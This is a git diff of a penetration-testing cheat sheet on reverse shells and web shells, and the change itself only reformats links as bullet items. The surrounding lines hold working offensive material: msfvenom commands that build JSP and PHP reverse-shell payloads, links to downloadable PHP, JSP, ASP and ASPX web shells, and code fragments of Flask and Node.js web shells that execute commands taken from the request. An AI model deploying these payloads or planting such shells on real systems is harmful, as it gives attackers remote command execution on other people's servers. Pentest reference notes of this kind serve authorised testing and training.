@@ -83,8 +83,8 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.js
 msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
 or  
-https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php  
-https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php
+- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php  
+- https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php
 
 ## Web Shells
 ### PHP 
@@ -95,15 +95,15 @@ https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Rev
 ```
 
 ### JSP
-https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmdjsp.jsp  
+- https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmdjsp.jsp  
 
 or in kali
 ```bash
 locate cmdjsp.jsp
 ```
 ### ASP
-https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd-asp-5.1.asp  
-https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.asp  
+-  https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd-asp-5.1.asp  
+- https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.asp  
 
 or in kali
 ```bash
@@ -112,7 +112,7 @@ locate cmdasp.asp
 ```
 
 ### ASPX
-https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx  
+- https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx  
 
 or in kali
 ```bash
@@ -133,7 +133,7 @@ def cmd():
 if __name__ == "__main__":
 	app.run()
 ```
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py
+- https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py
 
 ### Nodejs
 ```node
@@ -152,7 +152,7 @@ app.get('/okay/:command', (req, res) =>
 res.send(Exec(req.params.command))
 );
 ```
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js
+- https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js
 
 ### Perl
 -> Find and edit
@@ -176,19 +176,19 @@ stty raw -echo; fg
 
 ### tools to make life easier
 -> revshell generator  
-https://www.revshells.com/
+- https://www.revshells.com/
 
 -> CyberChef  
-https://gchq.github.io/CyberChef/
+- https://gchq.github.io/CyberChef/
 
 -> urlencoder  
-https://www.urlencoder.org/
+- https://www.urlencoder.org/
 
 -> octal  
-http://www.unit-conversion.info/texttools/octal/
+- http://www.unit-conversion.info/texttools/octal/
 
 -> hex  
-http://www.unit-conversion.info/texttools/octal/
+- http://www.unit-conversion.info/texttools/octal/
 
 -> IP converter  
 https://www.silisoftware.com/tools/ipconverter.php
